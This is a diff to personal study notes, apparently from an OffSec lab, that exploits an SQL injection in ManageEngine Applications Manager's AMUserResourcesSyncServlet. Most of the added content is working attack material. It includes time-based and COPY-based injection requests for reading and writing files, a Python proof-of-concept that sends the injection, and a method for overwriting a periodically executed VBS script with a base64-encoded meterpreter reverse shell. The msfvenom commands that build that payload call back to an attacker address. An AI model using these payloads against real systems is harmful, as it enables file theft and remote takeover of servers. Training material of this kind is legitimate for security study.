@@ -382,9 +382,136 @@ SELECT current_setting('is_superuser');
 ```
 Listing 29 - Checking our DB privileges
 
-```GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
+```
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
 Host: manageengine:8443
 ```
 Listing 30 - Checking if we are DBA
 
+```
+COPY <table_name> from <file_name>
+```
+Listing 31 - Reading content from files
+
+```
+COPY <table_name> to <file_name>
+```
+Listing 32 - Writing content to files
+
+```
+COPY (select $$awae$$) to <file_name>
+```
+Listing 33 - Using a subquery to return valid data so that the COPY operation can write to a file
+
+```
+CREATE temp table awae (content text);
+COPY awae from $$c:\awae.txt$$;
+SELECT content from awae;
+DROP table awae;
+```
+Listing 34 - Reading content from file C:\awae.txt
+
+
+We can implement this attack in a blind time-based query as follows:
+```
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;create+temp+table+awae+(content+text);copy+awae+from+$$c:\awae.txt$$;select+case+when(ascii(substr((select+content+from+awae),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0
+Host: manageengine:8443
+```
+Listing 35 - Reading the first character of the fle C:\awae.txt and comparing it with the letter "h". If the letter is "h", sleep for 10 seconds.
+
+```
+COPY (SELECT $$offsec$$) to $$c:\\offsec.txt$$;
+```
+Listing 36 - A simple query that will write to the disk in c:\
+
+We can translate that into the following request:
+
+```
+GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+ HTTP/1.0
+Host: manageengine:8443
+```
+Listing 37 - Writing to the file system using our SQL Injection vulnerability
+
+
+```
+ └─$ cat poc-me3.py                     
+import sys
+import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) usage %s <target>" % sys.argv[0])
+        print("(+) eg: %s target" % sys.argv[0])
+        sys.exit(1)
+    
+    t = sys.argv[1]
+    #proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+   
+    #sqli = ";"
+    #sqli = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
+    #sqli = "+UNION+SELECT+CASE+WHEN+(SELECT+1)=1+THEN+1+ELSE+0+END"
+    #sqli = "+UNION+SELECT+1"
+    #sqli = ";select+pg_sleep(10);"
+    sqli = ";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"
+
+    #r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
+    #                  params='ForMasRange=1&userId=1%s' % sqli, verify=False, proxies=proxies)
+    r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
+                      params='ForMasRange=1&userId=1%s' % sqli, verify=False)
+    
+    print(r.text)
+    print(r.headers)
+
+if __name__ == '__main__':
+    main()
+              
+```
+1
+(The PostgreSQL Global Development Group, 2020), https://www.postgresql.org/docs/9.2/static/sql-copy.html ↩︎
+
+##### Reverse Shell Via Copy To
+
+When the ManageEngine Application Manager is configured to monitor remote servers and applications (that is its job after all), a number of VBS scripts are executed on a periodic basis. These scripts are located in the C:\Program\ Files\ (x86)\ManageEngine\AppManager12\working\conf\application\scripts directory and vary by functionality.If we run the Sysinternals Process Monitor1 tool with a VBS path filter on our target host, we can see that one of the files that is executed on a regular basis is wmiget.vbs.
+
+A few things we need to keep in mind are:
+
+We need to make a backup copy of the target file as we will need to restore it once we are done with this attack vector.
+
+We have to convert the content of the target file to a one-liner and make sure it is still executing properly before appending our payload. This is because COPY\ TO can't handle newline control characters in a single SELECT statement.
+
+Our payload must also be on a single line for the same reason as stated above.
+
+We have to encode our payload twice in the GET request. We need to use base64 encoding to avoid any issues with restricted characters within the COPY TO function and we also need to urlencode the payload so that nothing gets mangled by the web server itself. Finally, we need to use the convert_from function to convert the output of the decode function to a human-readable format. The general query that we will use for the injection looks like this:
+
+```
+copy (select convert_from(decode($$ENCODED_PAYLOAD$$,$$base64$$),$$utf-8$$)) to $$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\\\application\\scripts\\wmiget.vbs$$;
+```
+Listing 38 - General structure of the query we inject
+
+We need to use a POST request due to the size of the payload, as it exceeds the limits of what a GET request can process. This is not an issue because, as we previously saw, the doPost function simply ends up calling the doGet function.
+Before putting all the pieces together let's generate our meterpreter reverse shell using the following command on Kali:
+```
+kali@kali:~$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.119.120 LPORT=4444 -e x86/shikata_ga_nai -f vbs
+```
+Listing 39 - Generating a VBS reverse shell          
+
+-----
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.45.202 LPORT=4444 -e x86/shikata_ga_nai -f vbs > rev.vbs
+
+cat rev.vbs| base64
+
+We url encoded the listing 38 string in post payload  without replacing ENCODED_PAYLOAD
+
+then created msfvenom reverse payload.
+ Converted the .vbs payload to a single line.
+ converted the original wmiget.vbs to single line.
+ 
+ Offsec suggested adding the payload at the end of existing wmiget.vbs file before quit function.
+ But since that didn't work for me, I added it at the beginning of the file.
+ 
+ Then the combined one line .vbs file content was urlencoded usind burp. That urlencoded content was used in replacing ENCODED_PAYLOAD.
+ 
+ 
 
